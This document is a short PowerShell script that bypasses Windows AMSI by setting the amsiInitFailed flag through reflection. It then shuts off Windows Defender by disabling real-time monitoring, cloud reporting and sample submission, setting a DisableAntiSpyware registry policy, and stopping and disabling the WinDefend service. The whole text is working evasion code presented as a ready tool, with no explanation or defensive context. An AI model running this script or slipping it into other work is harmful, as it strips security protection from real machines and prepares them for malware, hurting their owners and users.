# AMSI Bypass
$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed'
If (-Not $s) {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')::'amsiInitFailed' = $true}

# Disable Windows Defender in real-time
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows Defender cloud protection and sample submission
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2

# Disable Windows Defender via Registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

# Stop and disable Windows Defender service
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

# Confirmation message
Write-Host "Windows Defender has been disabled."
